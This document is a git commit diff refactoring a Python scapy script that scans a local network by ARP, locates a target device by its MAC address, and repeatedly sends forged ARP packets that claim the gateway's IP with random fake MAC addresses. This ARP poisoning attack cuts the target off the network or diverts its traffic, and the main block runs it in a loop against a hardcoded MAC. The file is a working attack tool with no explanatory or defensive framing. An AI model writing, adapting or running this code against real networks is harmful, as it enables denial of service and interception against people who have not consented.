666f73911f9cd809487ca9123aa98f5a237b9315
ZJYC <zhaojingyangchun@163.com>
2017-04-06 17:13:04 +0800

    change some function's interface

--- Python/arp.py
+++ Python/arp.py
@@ -1,187 +1,136 @@
-#!/usr/bin/env python
-# _*_ coding=utf-8 _*_
+#! /usr/bin/env python
 
 from scapy.all import *
 import time
 import random
 import os
-#-------------------------------------------------------
-#获取子网
-#OurIP :我们的IP地址
-#输入192.168.0.x输出192.168.0
-#-------------------------------------------------------
+
 def GetSubNet(OurIP):
-    Index = 0
-    SubString = ""
+    Index,SubString = 0,""
     while True:
         num = OurIP.find('.',Index)
-        if num != -1:
-            Index = num + 1
-        if num == -1:
-            SubString = OurIP[:Index]
-            break
+        if num != -1 : Index = num + 1
+        else : SubString = OurIP[:Index];break
     return SubString
-#-------------------------------------------------------
-#获取目标IP的MAC地址
-#tgtIP:目标IP
-#-------------------------------------------------------
-def GetMac(tgtIP):
-    retry = 4
+
+def GetMac(tgtIP,Retry=4):
+    cnt = 0
     try:
-        while retry > 0:
+        while cnt < Retry:
             tgtMac = getmacbyip(tgtIP)
-            if tgtMac == None:
-                print("Get Mac of ",tgtIP,"failed...Will Retry")
-                retry = retry - 1
+            if tgtMac is None:print("Get Mac of IP <%s> failed...Will Retry the <%s> times"%(tgtIP,cnt));cnt += 1
             else:return tgtMac
     except:
-        print("Get Mac of ",tgtIP,"failed...")
-#-------------------------------------------------------
-#获取局域网广播地址
-#OurIP :我们的IP地址
-#-------------------------------------------------------
-def GetBrocastIP(OurIP):
-    return GetSubNet(OurIP) + "255"
-#-------------------------------------------------------
-#伪造IP地址
-#OurIP:我们自己的IP
-#Num:要伪造多少个IP地址
-#-------------------------------------------------------
-def GetForgetIP(OurIP,Num):
+        print("Get Mac of %s failed..."%tgtIP)
+        return None
+
+def GetBrocastIP(OurIP):return GetSubNet(OurIP) + "255"
+
+def GetForgedIP(OurIP,Num):
     SubString = GetSubNet(OurIP)
-    #伪造IP
-    ForgetIP = []
-    i = 0
+
+    ForgedIP,i = [],0
     while i < Num:
-        num = int(random.uniform(0,255))
-        TempIP = SubString + "%d"%num
-        if TempIP == OurIP:
-            continue
-        else:
-            ForgetIP.append(TempIP)
-            i = i + 1
-    return ForgetIP
-#-------------------------------------------------------
-#伪造MAC地址
-#OurMac:我们自己的MAC地址
-#-------------------------------------------------------
-def GetForgeMac(OurMac,Num):
-    ForgeMac = []
-    j = 0
+        num = int(random.uniform(0,255));TempIP = SubString + "%d"%num
+        if TempIP == OurIP:continue
+        else:ForgedIP.append(TempIP);i += 1
+    return ForgedIP
+
+def GetForgedMac(OurMac,Num):
+    ForgedMac,j = [],0
     while j < Num:
         while True:
-            i = 0
-            TempMac = ""
+            i,TempMac = 0,""
             while i < 6:
-                num = int(random.uniform(0,255))
+                num = random.randrange(0,256,1)
                 TempMac = TempMac + "%02X"%num
                 if i <= 4:TempMac = TempMac + ":"
-                i = i + 1
-            if TempMac == OurMac:
-                pass
-            else:
-                ForgeMac.append(TempMac)
-                j = j + 1
-                break
-    return ForgeMac
-#-------------------------------------------------------
-#扫描网络，获取IP-MAC并保存
-#OurIP：我们的IP地址
-#Start：扫描起始地址 
-#End：扫描结束地址
-#TimeOut：超时时间
-#结果保存在字典Table中并打印出来
-#-------------------------------------------------------
+                i += 1
+            #Almost impossible that a forged MAC is our own.
+            if TempMac == OurMac:pass
+            else:ForgedMac.append(TempMac);j += 1;break
+    return ForgedMac
+
 Table = {}
-def Scanf(OurIP,Start,End,TimeOut):
-    Table.clear()
+def ScanfByArp(OurIP = "192.168.0.1",Start = 0,End = 255,TimeOut = 3,ClearAtFirst = True):
+    if ClearAtFirst is True : Table.clear()
     SubString = GetSubNet(OurIP)
     ip = []
-    for num in range(Start,End):
-        ip.append(SubString+str(num))
+    for num in range(Start,End+1):ip.append(SubString+str(num))
     ans,unans=srp(Ether(dst="FF:FF:FF:FF:FF:FF")/ARP(op=1,pdst=ip),timeout=TimeOut)
     def GetArpResult(r):
         Table[r.sprintf("%ARP.hwsrc%")] = r.sprintf("%ARP.psrc%")
         return r.sprintf("%ARP.hwsrc%\t%ARP.psrc%")
     g = lambda(s,r):GetArpResult(r)
     ans.summary(g)
-#-------------------------------------------------------
-#通过MAC地址获取IP地址
-#-------------------------------------------------------
-def GetIpByMac(Mac):
-    if len(Table) == 0:return None
-    return Table.get(Mac)
-#-------------------------------------------------------
-#针对MAC地址投毒
-#Face:网卡接口
-#PackNum:数据包数目
-#Counter:攻击次数(-1：无限次)
-#Interval:攻击间隔
-#例如：Face="wlan0",PackNum=10,Counter=-1,Interval=1
-#-------------------------------------------------------
-def Attack_MAC(Face,MAC,PackNum,Counter,Interval):
+
+def GetIpByMacWithRetry(Mac,Retry=4,Delay=4):
+    for i in range(0,Retry + 1):
+        time.sleep(i*Delay)
+        ScanfByArp(Start=100,End=150,TimeOut=5,ClearAtFirst=True)
+        Res = Table.get(Mac)
+        if Res is not None:return Res
+    else:print("Can not get ip of <%s>"%Mac);return None
+
+def Attack_MAC(Face,GWIP,MAC,PackNum,Counter,Interval):
+    
     MY_ip = get_if_addr(Face)
     MY_mac = get_if_hwaddr(Face)
-    print(MY_ip,"->",MY_mac)
-    if MY_ip == None or MY_mac == None:return
+    if MY_ip is None or MY_mac == None:return
+    print("%s -> %s"%(MY_ip,MY_mac))
     
     BctIP = GetBrocastIP(MY_ip)
     Bct_mac = "FF:FF:FF:FF:FF:FF"
-    print(BctIP,"->",Bct_mac)
+    print("%s -> %s"%(BctIP,Bct_mac))
     
-    GW_ip = "192.168.0.1"
+    GW_ip = GWIP
     GW_mac = GetMac(GW_ip)
-    print(GW_ip,"->",GW_mac)
-    if GW_mac == None:return
+    if GW_mac is None:return
+    print("%s -> %s"%(GW_ip,GW_mac))
     
     #XM_mac = "c8:3a:35:c0:05:15"
     #XM_mac = "24:09:95:95:e2:02"
     #XM_mac = "04:e6:76:46:a6:f3"
     XM_mac = MAC
-    #扫描局域网内主机，找不到目标MAC则延时再次扫描
-    ScanfCnt = 0
+    XM_ip = GetIpByMacWithRetry(XM_mac,4,4)
+    if XM_ip is None:return
+    print("%s -> %s"%(XM_ip,XM_mac))
+    cnt = 0
     while True:
-        Scanf(MY_ip,100,150,5)
-        XM_ip = GetIpByMac(XM_mac)
-        if XM_ip == None:ScanfCnt = ScanfCnt + 1
-        else:break
-        time.sleep(ScanfCnt*5)
-        if ScanfCnt > 20:return
-    print(XM_ip,"->",XM_mac)
-    
-    while True:
-        #伪造
-        Temp_mac = GetForgeMac(MY_mac,PackNum)
-        Temp_ip = GetForgetIP(MY_ip,PackNum)
-        
-        #PKT_1 = Ether(dst=GW_mac)/ARP(op=1,psrc=XM_ip,hwsrc=Temp_mac,pdst=GW_ip,hwdst=GW_mac)
-        PKT_2 = Ether(dst=XM_mac)/ARP(op=1,psrc=GW_ip,hwsrc=Temp_mac,\
-        pdst=XM_ip,hwdst=XM_mac)
-        try:
-            #time.sleep(0.5)
-            sendp(PKT_2,iface = Face)
-        except:
-            print("!!Send Error!!")
-        #sleep
-        #num = int(random.uniform(0,Interval))
-        #print("Will sleep for ",num,"S")
-        time.sleep(0.3)
-        if Counter == -1:
-            pass
+        Temp_mac = GetForgedMac(MY_mac,PackNum)
+        Temp_ip = GetForgedIP(MY_ip,PackNum)
+        PKT = Ether(dst=XM_mac)/ARP(op=1,psrc=GW_ip,hwsrc=Temp_mac,pdst=XM_ip,hwdst=XM_mac)
+        try:sendp(PKT,iface = Face);cnt += 1
+        except:print("!!Send Error!!")
+        print("Will sleep for %s S and had sent %s PKTs"%(Interval,cnt))
+        time.sleep(Interval)
+        if Counter == -1:pass
         else:
-            Counter = Counter - 1
-            if Counter == 0:
-                return
-#-------------------------------------------------------
-#检查WIFI是否连接，否则重连
-#-------------------------------------------------------
-def EnsureWifiConnection():
-    if '192' not in os.popen('ifconfig | grep 192').read():
-        print('\n****** wifi is down, restart... ******\n')
+            if cnt >= Counter:return
+
+def EnsureWifiConnection(GWIP="192.168.0.1",Interface="eth0",Delay=2):
+    '''
+    GWIP:your gateway's ip
+    Interface:the network interface you want to use
+    Delay:
+    '''
+    if IsWifiWorkWell(GWIP) is False:
+        print("Will restart the interface <%s>"%Interface)
+        os.system("ifconfig %s down"%Interface)
+        time.sleep(Delay)
+        os.system("ifconfig %s up"%Interface)
+        time.sleep(Delay)
         os.system('sudo /etc/init.d/networking restart')
-        time.sleep(30)
+        time.sleep(Delay)
+        print("Network restart finished...")
         return True
     else:return False
+def IsWifiWorkWell(GWIP = "192.168.0.1"):
+    '''
+    To check whether the wifi is working well by acquiring GWIP's MAC(Usually our gateway's IP)
+    '''
+    if GetMac(GWIP) is None:return False
+    else:return True
 if __name__ == "__main__":
     #while True:
     #AttackIP("192.168.0.108","wlan0",10,60,"192.168.0.1")
@@ -194,4 +143,4 @@ if __name__ == "__main__":
     #    print(num)
     while True:
         EnsureWifiConnection()
-        Attack_MAC("wlan0","04:e6:76:46:a6:f3",2,100,1)
+        Attack_MAC("ens33","192.168.0.1","04:e6:76:46:a6:f3",60,300,1)
